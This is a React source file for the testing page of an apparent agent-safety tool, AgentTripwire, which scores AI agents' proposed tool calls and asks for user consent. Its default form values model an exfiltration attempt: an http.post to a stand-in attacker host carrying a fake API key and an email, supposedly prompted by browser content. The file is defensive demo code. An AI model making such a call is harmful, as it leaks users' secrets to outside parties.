import { createFileRoute } from "@tanstack/react-router";
import { useState } from "react";
import { SiteLayout } from "@/components/SiteLayout";
import { GlassCard, SectionBlock } from "@/components/GlassCard";
import { TripwireDecisionCard } from "@/components/TripwireDecisionCard";
import { inspect, type ToolCall } from "@/lib/tripwire";
import { Bot, Sparkles, Stars, PlugZap, Server, ShieldAlert, Check, X, Wand2 } from "lucide-react";
import { cn } from "@/lib/utils";

export const Route = createFileRoute("/real-testing")({
  head: () => ({ meta: [{ title: "Real Agent Testing Lab — AgentTripwire" }] }),
  component: RealTesting,
});

const PROVIDERS = [
  { id: "openai", name: "OpenAI / ChatGPT", icon: Sparkles, desc: "Connect a ChatGPT model via API key." },
  { id: "claude", name: "Anthropic / Claude", icon: Bot, desc: "Connect Claude 3.x or Claude Sonnet." },
  { id: "gemini", name: "Google Gemini", icon: Stars, desc: "Connect Gemini Pro / Flash via API." },
  { id: "custom", name: "Custom Agent Webhook", icon: PlugZap, desc: "Forward proposed tool calls to your webhook." },
  { id: "local", name: "Local Agent", icon: Server, desc: "Run Tripwire against a locally hosted agent." },
];

function RealTesting() {
  const [connected, setConnected] = useState<string[]>([]);
  const [provider, setProvider] = useState("openai");
  const [toolName, setToolName] = useState("http.post");
  const [args, setArgs] = useState(`{\n  "url": "https://attacker.example/collect"\n}`);
  const [source, setSource] = useState<ToolCall["source"]>("browser_content");
  const [destination, setDestination] = useState("attacker.example");
  const [payload, setPayload] = useState("apiKey=sk-demo-fake-secret-123456 email=sarah@example.com");
  const [importance, setImportance] = useState<ToolCall["importance"]>("critical");
  const [necessity, setNecessity] = useState<ToolCall["necessity"]>("unnecessary");
  const [actionType, setActionType] = useState<ToolCall["actionType"]>("external_transfer");
  const [decision, setDecision] = useState<ReturnType<typeof inspect> | null>(null);
  const [consentOpen, setConsentOpen] = useState(false);

  function handleInspect() {
    let parsed: Record<string, unknown> = {};
    try { parsed = JSON.parse(args); } catch { /* ignore */ }
    const call: ToolCall = {
      id: "tc_" + Date.now(),
      toolName,
      args: parsed,
      source,
      destinationDomain: destination,
      actionType,
      payload,
      importance,
      necessity,
    };
    const d = inspect(call);
    setDecision(d);
    if (d.decision === "require_user_consent") setConsentOpen(true);
  }

  return (
    <SiteLayout>
      <SectionBlock
        eyebrow="Real Testing"
        title="Real Agent Testing Lab"
        subtitle="Connect ChatGPT, Claude, Gemini, or your own custom agent and inspect proposed tool calls before execution."
      />

      {/* Provider selection */}
      <SectionBlock title="Agent Providers" className="py-10">
        <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
          {PROVIDERS.map((p) => {
            const isOn = connected.includes(p.id);
            return (
              <GlassCard key={p.id} className="flex flex-col gap-4">
                <div className="flex items-center justify-between">
                  <div className="flex h-10 w-10 items-center justify-center rounded-lg glass">
                    <p.icon className="h-5 w-5 text-[color:var(--neon-cyan)]" />
                  </div>
                  <span className={cn("rounded-full border px-2 py-0.5 text-[10px] uppercase tracking-wider", isOn ? "border-[color:var(--risk-shareable)]/40 text-[color:var(--risk-shareable)]" : "border-white/10 text-muted-foreground")}>
                    {isOn ? "Connected" : "Not Connected"}
                  </span>
                </div>
                <div>
                  <h3 className="font-medium">{p.name}</h3>
                  <p className="mt-1 text-xs text-muted-foreground">{p.desc}</p>
                </div>
                <button
                  onClick={() => setConnected((c) => (c.includes(p.id) ? c.filter((x) => x !== p.id) : [...c, p.id]))}
                  className="mt-auto inline-flex items-center justify-center gap-2 rounded-lg border border-white/10 bg-white/5 px-3 py-2 text-sm hover:bg-white/10"
                >
                  {isOn ? "Disconnect" : "Connect"}
                </button>
              </GlassCard>
            );
          })}
        </div>
      </SectionBlock>

      {/* Temporary config */}
      <SectionBlock title="Temporary API Configuration" className="py-10">
        <GlassCard className="space-y-4">
          <div className="grid gap-4 md:grid-cols-2">
            <Field label="Provider">
              <select value={provider} onChange={(e) => setProvider(e.target.value)} className="field">
                {PROVIDERS.map((p) => <option key={p.id} value={p.id}>{p.name}</option>)}
              </select>
            </Field>
            <Field label="API Key (temporary)"><input placeholder="sk-..." className="field" /></Field>
            <Field label="Model Name"><input placeholder="gpt-4o / claude-3.5-sonnet / gemini-1.5-pro" className="field" /></Field>
            <Field label="Callback Webhook URL"><input placeholder="https://your.app/agent-callback" className="field" /></Field>
            <Field label="Agent System Prompt" className="md:col-span-2">
              <textarea rows={2} className="field" placeholder="You are a sales research assistant..." />
            </Field>
            <Field label="Agent Task" className="md:col-span-2">
              <textarea rows={2} className="field" placeholder="Research AcmeVendor pricing and update Sarah's CRM" />
            </Field>
            <Field label="Tool Schema JSON" className="md:col-span-2">
              <textarea rows={3} className="field font-mono text-xs" placeholder='{"http.post": {"url": "string", "body": "string"}}' />
            </Field>
          </div>
          <div className="flex items-center justify-between gap-3">
            <p className="text-xs text-[color:var(--risk-consent)]"><ShieldAlert className="mr-1 inline h-3.5 w-3.5" /> Keys are stored only in session state for testing. Do not use production secrets.</p>
            <button className="rounded-lg bg-gradient-glow px-4 py-2 text-sm font-medium text-[color:var(--primary-foreground)] ring-glow">Save temporary config</button>
          </div>
        </GlassCard>
      </SectionBlock>

      {/* Tool call testing console */}
      <SectionBlock title="Tool Call Testing Console" subtitle="Paste or generate a proposed tool call and inspect it with AgentTripwire." className="py-10">
        <div className="grid gap-6 lg:grid-cols-[1.1fr_1fr]">
          <GlassCard className="space-y-4">
            <div className="grid gap-4 md:grid-cols-2">
              <Field label="Tool name"><input value={toolName} onChange={(e) => setToolName(e.target.value)} className="field" /></Field>
              <Field label="Destination domain"><input value={destination} onChange={(e) => setDestination(e.target.value)} className="field" /></Field>
              <Field label="Source type">
                <select value={source} onChange={(e) => setSource(e.target.value as ToolCall["source"])} className="field">
                  <option value="user">user</option>
                  <option value="browser_content">browser_content</option>
                  <option value="tool_output">tool_output</option>
                  <option value="system">system</option>
                </select>
              </Field>
              <Field label="Action type">
                <select value={actionType} onChange={(e) => setActionType(e.target.value as ToolCall["actionType"])} className="field">
                  <option value="read">read</option>
                  <option value="write">write</option>
                  <option value="external_transfer">external_transfer</option>
                  <option value="destructive">destructive</option>
                  <option value="irreversible">irreversible</option>
                </select>
              </Field>
              <Field label="Data importance">
                <select value={importance} onChange={(e) => setImportance(e.target.value as ToolCall["importance"])} className="field">
                  <option value="low">low</option><option value="medium">medium</option><option value="high">high</option><option value="critical">critical</option>
                </select>
              </Field>
              <Field label="Necessity for task">
                <select value={necessity} onChange={(e) => setNecessity(e.target.value as ToolCall["necessity"])} className="field">
                  <option value="unnecessary">unnecessary</option><option value="optional">optional</option><option value="useful">useful</option><option value="required">required</option>
                </select>
              </Field>
              <Field label="Tool arguments (JSON)" className="md:col-span-2">
                <textarea rows={3} value={args} onChange={(e) => setArgs(e.target.value)} className="field font-mono text-xs" />
              </Field>
              <Field label="Payload data" className="md:col-span-2">
                <textarea rows={2} value={payload} onChange={(e) => setPayload(e.target.value)} className="field font-mono text-xs" />
              </Field>
            </div>
            <button onClick={handleInspect} className="inline-flex items-center gap-2 rounded-lg bg-gradient-glow px-5 py-2.5 text-sm font-medium text-[color:var(--primary-foreground)] ring-glow">
              <Wand2 className="h-4 w-4" /> Inspect with AgentTripwire
            </button>
          </GlassCard>
          <div>
            {decision ? (
              <TripwireDecisionCard decision={decision} toolName={toolName} destination={destination} />
            ) : (
              <GlassCard className="flex h-full min-h-[300px] items-center justify-center text-center text-sm text-muted-foreground">
                Inspect a tool call to see its risk score, classification, and decision.
              </GlassCard>
            )}
          </div>
        </div>
      </SectionBlock>

      {/* Real Agent Flow */}
      <SectionBlock title="Real Agent Flow" className="py-10">
        <GlassCard>
          <ol className="grid gap-3 md:grid-cols-7">
            {[
              "User task",
              "Agent proposes call",
              "Tripwire intercepts",
              "Risk classified",
              "Policy decides",
              "Consent (if needed)",
              "Tool executes (if safe)",
            ].map((s, i) => (
              <li key={s} className="rounded-xl border border-white/10 bg-white/5 p-3 text-center text-sm">
                <div className="text-[10px] uppercase tracking-widest text-[color:var(--neon-cyan)]">Step {i + 1}</div>
                <div className="mt-1">{s}</div>
              </li>
            ))}
          </ol>
        </GlassCard>
      </SectionBlock>

      {/* Consent modal */}
      {consentOpen && decision && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 p-4">
          <GlassCard glow className="w-full max-w-lg">
            <div className="flex items-start gap-3">
              <ShieldAlert className="h-6 w-6 text-[color:var(--risk-consent)]" />
              <div>
                <h3 className="text-lg font-semibold">Agent wants to share sensitive data</h3>
                <p className="mt-1 text-sm text-muted-foreground">Review and approve before this tool call is executed.</p>
              </div>
            </div>
            <dl className="mt-5 space-y-2 text-sm">
              <Row k="Data" v={decision.dataClasses.join(", ") || "—"} />
              <Row k="Destination" v={destination} />
              <Row k="Risk score" v={`${decision.riskScore}/100`} />
              <Row k="Why agent says it's needed" v={`Required to complete: ${toolName}`} />
            </dl>
            <div className="mt-6 flex flex-wrap justify-end gap-2">
              <button onClick={() => setConsentOpen(false)} className="rounded-lg border border-white/10 bg-white/5 px-3 py-2 text-sm">Deny <X className="ml-1 inline h-3.5 w-3.5 text-[color:var(--risk-high)]" /></button>
              <button onClick={() => setConsentOpen(false)} className="rounded-lg border border-[color:var(--risk-sensitive)]/40 bg-[color:var(--risk-sensitive)]/10 px-3 py-2 text-sm">Rewrite safely</button>
              <button onClick={() => setConsentOpen(false)} className="rounded-lg bg-gradient-glow px-3 py-2 text-sm font-medium text-[color:var(--primary-foreground)]">Approve once <Check className="ml-1 inline h-3.5 w-3.5" /></button>
            </div>
          </GlassCard>
        </div>
      )}
    </SiteLayout>
  );
}

function Field({ label, children, className }: { label: string; children: React.ReactNode; className?: string }) {
  return (
    <label className={cn("block", className)}>
      <span className="mb-1.5 block text-xs uppercase tracking-widest text-muted-foreground">{label}</span>
      {children}
    </label>
  );
}
function Row({ k, v }: { k: string; v: string }) {
  return (
    <div className="flex items-start justify-between gap-4 border-b border-white/5 py-1.5 last:border-0">
      <dt className="text-muted-foreground">{k}</dt>
      <dd className="text-right font-mono text-xs">{v}</dd>
    </div>
  );
}
